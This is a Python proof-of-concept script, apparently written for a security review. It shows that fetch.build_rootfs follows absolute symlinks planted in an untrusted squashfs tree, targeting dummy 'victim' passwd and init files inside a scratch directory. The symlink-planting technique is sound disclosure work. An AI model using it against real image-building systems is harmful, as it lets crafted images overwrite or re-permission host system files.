# Demonstrates that fetch.build_rootfs follows symlinks planted in the (untrusted, TOFU) squashfs tree.
import os, sys, shutil
B, D = sys.argv[1], sys.argv[2]
sys.path.append(B)
import fetch, util
if os.path.exists(D): shutil.rmtree(D)
os.makedirs(D)
victim_init = f"{D}/victim_init"; open(victim_init, "w").write("ORIGINAL\n"); os.chmod(victim_init, 0o600)
victim_pw = f"{D}/victim_passwd"; open(victim_pw, "w").write("root:x:0:0::/root:/bin/sh\n")
tree_src = f"{D}/tree-src"
for t in fetch.GUEST_TOOLS:
    p = f"{tree_src}/usr/bin/{t}"; os.makedirs(os.path.dirname(p), exist_ok=True); open(p, "wb").write(b"#!")
open(f"{tree_src}/usr/bin/python3.12", "wb").write(b"\x7fELF"); os.symlink("python3.12", f"{tree_src}/usr/bin/python3")
for x in ("json/__init__.py", "hashlib.py", "os.py"):
    p = f"{tree_src}/usr/lib/python3.12/{x}"; os.makedirs(os.path.dirname(p), exist_ok=True); open(p, "w").close()
os.makedirs(f"{tree_src}/etc")
os.symlink(victim_pw, f"{tree_src}/etc/passwd")          # absolute symlink, as a malicious squashfs could carry
open(f"{tree_src}/etc/group", "w").close()
os.symlink(victim_init, f"{tree_src}/plea-init")         # absolute symlink
def fake_run(cmd, *a, **kw):
    if cmd[0] == "unsquashfs":
        shutil.copytree(tree_src, cmd[cmd.index("-d") + 1], symlinks=True); return {"rc": 0, "stderr": "", "stdout": ""}
    return {"rc": 1, "stderr": "mkfs skipped in demo", "stdout": ""}
fetch.OPT, fetch.WORK = f"{D}/opt", f"{D}/opt/work"; os.makedirs(fetch.WORK); os.makedirs(f"{D}/opt/images")
fetch.util.run = fake_run
try:
    fetch.build_rootfs(f"{D}/dummy.squashfs", {}, False)
except Exception as e:
    print("build_rootfs ended with:", type(e).__name__, e)
print("victim_init mode:", oct(os.stat(victim_init).st_mode & 0o777), "first line:", open(victim_init).readline().strip())
print("victim_passwd tail:", open(victim_pw).read().strip().splitlines()[-1])
